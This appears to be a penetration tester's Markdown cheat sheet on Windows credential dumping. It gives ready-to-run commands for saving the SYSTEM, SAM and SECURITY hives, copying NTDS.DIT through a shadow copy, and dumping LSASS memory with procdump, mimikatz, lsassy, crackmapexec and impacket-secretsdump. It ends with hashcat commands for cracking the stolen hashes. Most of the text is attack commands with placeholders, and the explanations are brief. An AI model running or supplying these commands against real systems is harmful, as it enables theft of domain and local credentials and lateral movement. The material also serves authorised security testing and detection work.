# Credentials Dumping
Requirements:
* Probably need administrator or SYSTEM or debug privileges

## SYSTEM - Keys
Required SYSTEM hive to decrypt other useful hives.

`reg SAVE HKLM\SYSTEM C:\Windows\Temp\SYSTEM`

## NTDS.DIT - All domain account hashes & kerberos keys
The AD database is saved in a file on every DC in the domain. The AD database is stored in the NTDS.DIT file located in the NTDS folder of the system root. On DC you can retrieve NTDS.DIT file for domain users. hashes can be used for Pass The Hash attack (except cached hashes).

```
vssadmin create shadow /for=C:
copy <SHADOW_PATH>\Windows\NTDS\ntds.dit C:\Windows\Temp\NTDS
vssadmin delete shadows /shadow=<SHADOW_ID>
```
`impacket-secretsdump -ntds <NTDS> -system <SYSTEM> LOCAL`

`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> --ntds`

mimikatz # `lsadump::dcsync \all`

## SAM - Local account hashes
Windows stores and manages the local user and group accounts in a database file called Security Account Manager (SAM). It  authenticates local user logons. On a domain controller, it simply stores the administrator account from the time it was a server, which serves as the Directory Services Restore Mode (DSRM) recovery account.
`reg SAVE HKLM\SAM C:\Windows\Temp\SAM`
`impacket-secretsdump -sam <SAM> -system <SYSTEM> LOCAL`

`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> --sam`

mimikatz # `token::elevate lsadump::sam /system:<SYSTEM> /SAM:<SAM>`
mimikatz # `token::elevate lsadump::sam`

## SECURITY - Cached domain account hashes & LSA secrets
Each time a user logs on to a domain, Windows caches the credentials supplied and stores them in the security hive in the registry of the operation system. With cached credentials, the user can log on to a domain member without being connected to a domain controller within that domain. Mscash is a Microsoft hashing algorithm that is used for storing cached domain credentials locally on a system after a successful logon. It's worth noting that cached credentials do not expire. Isnot saved on a DC.

The LSA secrets, which are secret pieces of data that are accessible only to SYSTEM account processes, are stored (in some circumstances) on the hard disk drive. Some of these secrets are credentials that must persist after reboot. Credentials stored as LSA secrets might include:
* Account password for the computer's Active Directory Domain Services (AD DS) account
* Account passwords for Windows services that are configured on the computer
* Account passwords for configured scheduled tasks
* Account passwords for IIS application pools and websites
* Passwords for Microsoft accounts

`reg SAVE HKLM\SECURITY C:\Windows\Temp\SECURITY`
`impacket-secretsdump -security <SECURITY> -system <SYSTEM> LOCAL`

`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> --lsa`

mimikatz # `token::elevate lsadump::cache`

mimikatz # `token::elevate lsadump::lsa /inject` **? LOCAL ACCOUNTS?!**

## LSASS.exe process - active domain account hashes & tickets
The Local Security Authority Subsystem Service (LSASS) stores credentials in memory on behalfs of users with active Windows sessions. LSASS can store credentials in multiple forms, including: 
* reversibly encrypted plaintext
* kerberos tickets (ticket-granting tickets (TGTs), service tickets)
* NT hash and LM hash

Tools for remote dumping creds needs port 139 or 445 to be open for SMB:
`lsassy -d <DOMAIN> -u <USER> -p <PASS> <IP>`
`crackmapexec smb <IP> -d <DOMAIN> -u <USER> -p <PASS> -M lsassy`

Local dumping:
`procdump -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp`
mimikatz # `sekurlsa::minidump <DUMPFILE>`
mimikatz # `sekurlsa::logonPasswords`







`hashcat -m 1000 <HASH> <PASSLIST> --potfile-disable`
`hashcat -m 2100 <HASH> <PASSLIST> --potfile-disable`


`impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>'`